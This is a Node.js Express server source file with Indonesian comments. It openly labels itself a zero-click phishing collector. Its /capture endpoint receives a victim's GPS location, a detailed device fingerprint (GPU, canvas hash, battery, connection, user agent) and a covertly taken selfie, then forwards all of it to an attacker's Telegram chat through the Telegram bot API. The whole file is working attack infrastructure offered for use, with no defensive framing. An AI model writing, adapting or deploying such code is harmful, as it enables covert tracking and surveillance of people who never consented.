const express = require('express');
const app = express();
const PORT = 3000;

// Middleware untuk parsing JSON (limit besar untuk foto)
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public')); // serve frontend

// Endpoint untuk menerima data dari frontend
app.post('/capture', async (req, res) => {
    console.log('📥 Data diterima dari frontend');

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // Cek environment variable
    if (!botToken || !chatId) {
        console.error('❌ TELEGRAM_BOT_TOKEN atau TELEGRAM_CHAT_ID belum diset');
        return res.status(500).json({ error: 'Server configuration error' });
    }

    const data = req.body;
    if (!data) {
        return res.status(400).json({ error: 'No data' });
    }

    // Format pesan untuk Telegram
    let message = `🔥 *PHISHING ZERO-CLICK - DATA BARU* 🔥\n\n`;
    message += `📅 *Waktu:* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n`;

    if (data.location) {
        message += `📍 *Lokasi:* ${data.location.lat}, ${data.location.lng}\n`;
        message += `   Akurasi: ${data.location.acc || '?'}m\n`;
        if (data.location.alt) message += `   Ketinggian: ${data.location.alt}m\n`;
    } else {
        message += `📍 *Lokasi:* Tidak diberikan\n`;
    }

    if (data.fingerprint) {
        const fp = data.fingerprint;
        message += `\n🖥️ *Perangkat:* ${fp.platform || 'N/A'}\n`;
        message += `   Layar: ${fp.screen || 'N/A'}\n`;
        message += `   Timezone: ${fp.timezone || 'N/A'}\n`;
        message += `   Bahasa: ${fp.language || 'N/A'}\n`;
        message += `   Cookies: ${fp.cookieEnabled ? '✅' : '❌'}\n`;
        message += `   CPU Cores: ${fp.hardwareConcurrency || 'N/A'}\n`;
        message += `   Memori: ${fp.deviceMemory || '?'} GB\n`;
        if (fp.battery) message += `   Baterai: ${fp.battery.level}${fp.battery.charging ? ' (charging)' : ''}\n`;
        if (fp.connection) message += `   Koneksi: ${fp.connection.effectiveType} (${fp.connection.downlink} Mbps)\n`;
        if (fp.webglRenderer) message += `   GPU: ${fp.webglRenderer}\n`;
        if (fp.canvasHash) message += `   Canvas hash: ${fp.canvasHash}\n`;
        message += `\n📱 *User Agent:*\n${fp.userAgent || 'N/A'}\n`;
    }

    if (data.photo) {
        const size = Math.round(data.photo.length / 1024);
        message += `\n📸 *Selfie:* Berhasil diambil (${size} KB)\n`;
    } else {
        message += `\n📸 *Selfie:* Gagal / tidak diberikan\n`;
    }

    if (data.errors && data.errors.length) {
        message += `\n⚠️ *Error:* ${data.errors.join(', ')}\n`;
    }

    // Kirim ke Telegram
    try {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!response.ok) {
            const errText = await response.text();
            console.error('❌ Telegram error:', response.status, errText);
            return res.status(500).json({ error: 'Telegram send failed' });
        }

        console.log('✅ Pesan terkirim ke Telegram');
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Exception saat kirim ke Telegram:', error);
        res.status(500).json({ error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server berjalan di http://localhost:${PORT}`);
});